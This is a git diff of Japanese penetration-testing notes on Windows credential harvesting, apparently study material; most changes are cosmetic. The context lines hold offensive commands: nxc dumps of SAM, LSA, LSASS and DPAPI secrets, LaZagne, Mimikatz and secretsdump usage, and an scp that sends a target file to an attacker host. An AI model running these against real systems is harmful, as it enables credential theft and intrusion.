@@ -24,7 +24,7 @@
 
 ## Lazagne
 
-- [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
+- 🔗[Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
 - 基本は管理者権限で使用する
 - 一般ユーザー権限でも使えるが、機能は<u>大幅に制限</u>される
 ```powershell
@@ -37,16 +37,16 @@
 - ターゲット環境のローカル管理者権限が必要
 ```zsh
 # from sam
-nxc smb <TargetIp> -u <username> -p <pw> --sam [secdump]
+nxc smb <target_IP> -u <username> -p <pw> --sam [secdump]
 
 # from lsa
-nxc smb <TargetIP> -u <username> -p <pw> --lsa [secdump]
+nxc smb <target_IP> -u <username> -p <pw> --lsa [secdump]
 
 # from lsass
-nxc smb <TargetIP> -u <username> -p <pw> -M lsassy
+nxc smb <target_IP> -u <username> -p <pw> -M lsassy
 
 # from DPAPI
-nxc smb <TargetIP> -u <username> -p <pw> --dpapi
+nxc smb <target_IP> -u <username> -p <pw> --dpapi
 ```
 - ユーザーがローカルユーザーなら、`--local-auth`を付与
 
@@ -80,14 +80,14 @@ nxc smb <TargetIP> -u <username> -p <pw> --dpapi
 ## 留意点
 
 - Standard User（一般ユーザー）はホームディレクトリ配下のファイルのみ閲覧可能であることが多いため、ルートディレクトリから再帰探索してヒットしたファイルにアクセスできない場合がある
-	- →🚨ゴミ情報が多いので、ルートディレクトリから探索は避ける
-- 💡以下のディレクトリで検索すること
+	- →ゴミ情報が多いので、**ルートディレクトリから探索は避ける**
+- 以下のディレクトリで検索すること
 	- ①ユーザーのホームディレクトリ
 	- ②[🔍 Credentials Harvesting](#インストール済みアプリケーションの列挙)で判明したアプリケーションの`Install Location`
 	- ③ユーザーのホームディレクトリから一階層上がったディレクトリ→さらに一階層あがったディレクトリ...
 	- ④`C:\`ディレクトリ：==通常の構成と異なるディレクトリがあれば==要注目
-- ⚠️興味深い情報がエンコードされていて簡単に読み取れない可能性もある
-- ⚠️隠し属性のついたファイルは、`ls -Force`で表示できる
+- 興味深い情報がエンコードされていて簡単に読み取れない可能性もある
+- 隠し属性のついたファイルは、`ls -Force`で表示できる
 
 ## 興味深い情報の列挙コマンド
 
@@ -148,7 +148,7 @@ reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions" /s
 気になるバイナリがあれば文字列を確認
 ```powershell
 # target
-scp .\<binary_file> <Attacker_username>@<AttackerIP>:/home/<Attacker_username>
+scp .\<binary_file> <attacker_username>@<attacker_IP>:/home/<attacker_username>
 ```
 ```zsh
 # attacker
@@ -167,9 +167,10 @@ ls -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
     }
 } | Select-Object FullName | Where-Object -Property FullName -notlike "*\Prefetch\*"
 ```
-- ⚠️出力とモレが多いので、一瞬であたりをつけるくらいのレベル感
 
-- 💡その他、インストールされたアプリケーションのconfigファイルやセッションに認証情報が保存されている可能性もあるため、必ず確認すること
+>[!NOTE]
+>- 出力とモレが多いので、あたりをつけるくらいの認識で使用すること
+>- その他、インストールされたアプリケーションのconfigファイルやセッションに認証情報が保存されている可能性もあるため、必ず確認すること
 
 ---
 
@@ -177,7 +178,7 @@ ls -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
 
 ## 目的
 
-- PowerShellのログ（トランスクリプトなど）に記録された非常に価値のある情報を探索する
+ PowerShellのログ（トランスクリプトなど）に記録された非常に価値のある情報を探索する。
 
 ## PowerShellのログ内容確認コマンド
 
@@ -192,7 +193,7 @@ PSReadlineモジュールのログ記録パス表示
 (Get-PSReadlineOption).HistorySavePath
 ```
 - `Get-PSReadlineOption`というモジュールの、`HistorySavePath`というオプションを取得する
-- ⚠️記録パスがあっても、ファイルの中身があるとは限らない(PathNotFoundと表示される)
+- 記録パスがあっても、ファイルの中身があるとは限らない(PathNotFoundと表示される)
 
 ## PowerShellのログ内容確認 w/ Event Viewer
 
@@ -216,7 +217,7 @@ $$EventViewerのイメージ$$
     - （PowerShell v5以降に導入）
     - **`ConsoleHost_history.txt`** というファイルに保存される
     - `Clear-History`では削除されない
-    - 対策は以下コマンド：
+    - 保存しないようにするには、以下コマンドを実行する
 ```powershell
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 ```
@@ -233,7 +234,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
 ## Registry Hives からの取得
 
-[💥Windows Privilege Escalation](../💥Windows%20Privilege%20Escalation.md#SAM・SYSTEMハイブ悪用による権限昇格)
+[SAM・SYSTEMハイブ悪用による権限昇格](../💥Windows%20Privilege%20Escalation.md#SAM・SYSTEMハイブ悪用による権限昇格)
 
 ## Volume Shadow Copy Service (VSS) を利用した取得
 
@@ -276,7 +277,9 @@ impacket-secretsdump -sam <SAMデータベースのファイルフルパス> -sy
 1. この後の手順で"Access is denied"エラーを防ぐため、レジストリ値を修正
 
 2. Task Managerを開く -> Detailsタブへ -> lsass.exeファイルを右クリック -> Create dump file
+ 
  ![ 380](../../../画像ファイル/Pasted%20image%2020230602114024.png)
+ 
 
 3.  ダンプされたプロセスをMimikatzフォルダにコピー
 ```cmd
@@ -465,8 +468,6 @@ Get-AdmPwdPassword -ComputerName <MachineName>
 2. Descriptionの中にサービスアカウントのパスワードがある
 
 ![ 500](../../../画像ファイル/Pasted%20image%2020230421111143.png)
-
-
 
 ---
 
